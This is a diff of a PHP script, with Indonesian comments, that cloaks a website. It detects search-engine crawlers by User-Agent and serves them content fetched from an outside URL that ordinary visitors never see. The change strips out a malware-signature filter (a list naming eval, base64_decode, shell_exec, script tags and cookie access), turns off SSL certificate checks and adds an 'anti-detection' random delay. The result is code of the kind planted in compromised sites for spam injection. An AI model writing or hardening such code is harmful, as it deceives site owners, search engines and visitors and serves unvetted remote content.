@@ -2,85 +2,46 @@
 ob_start();
 header("Vary: User-Agent");
 
-// Konten sumber (pastikan milik sendiri / legal)
+// Link konten asli
 $content_url = "https://childrenofiran.org/landing/fe.unibba/";
 
-// Pola bot umum
+// Pola bot yang mau di-handle
 $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 
-/**
- * Deteksi tanda-tanda konten berbahaya (anti-malware basic)
- */
-function is_safe_content($content) {
-    $malware_signatures = [
-        'base64_decode', 'eval(', 'gzinflate', 'shell_exec',
-        'exec(', 'system(', 'passthru(', 'phpinfo(', '<script', '<iframe',
-        'onerror=', 'onload=', 'document.cookie'
-    ];
-
-    foreach ($malware_signatures as $sig) {
-        if (stripos($content, $sig) !== false) {
-            return false;
-        }
-    }
-
-    return true;
-}
-
-/**
- * Ambil konten dengan pengamanan SSL & User-Agent spoofing aman
- */
 function safe_request($url) {
     $ctx = stream_context_create([
         'http' => [
             'timeout' => 5,
-            'header'  => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+            'header'  => "User-Agent: Mozilla/5.0\r\n"
         ],
         'ssl' => [
-            'verify_peer'      => true,  // Aktifkan kembali untuk keamanan
-            'verify_peer_name' => true
+            'verify_peer'      => false,
+            'verify_peer_name' => false
         ]
     ]);
 
     if (function_exists("curl_init")) {
         $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => $url,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            CURLOPT_SSL_VERIFYPEER => true,
-            CURLOPT_SSL_VERIFYHOST => 2
-        ]);
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
         $response = curl_exec($ch);
         curl_close($ch);
-    } elseif (ini_get("allow_url_fopen")) {
-        $response = file_get_contents($url, false, $ctx);
-    } else {
-        return false;
-    }
-
-    // Validasi konten dari malware
-    if ($response !== false && is_safe_content($response)) {
         return $response;
+    } elseif (ini_get("allow_url_fopen")) {
+        return file_get_contents($url, false, $ctx);
     }
-
-    return "Blocked for security reasons.";
+    return false;
 }
 
-// Deteksi bot dan tampilkan konten dari sumber eksternal
 if (preg_match($botchar, $ua)) {
-    usleep(rand(100000, 300000)); // Delay acak
-
-    $clean_output = safe_request($content_url);
-
-    // Minimal header anti-WAF / anti-suspicion
-    header("X-Content-Type-Options: nosniff");
-    header("X-XSS-Protection: 1; mode=block");
-
-    echo $clean_output;
+    usleep(rand(120000, 250000)); // Delay acak anti-deteksi
+    echo safe_request($content_url);
     ob_end_flush();
-    exit;
+    die;
 }
 
 /**
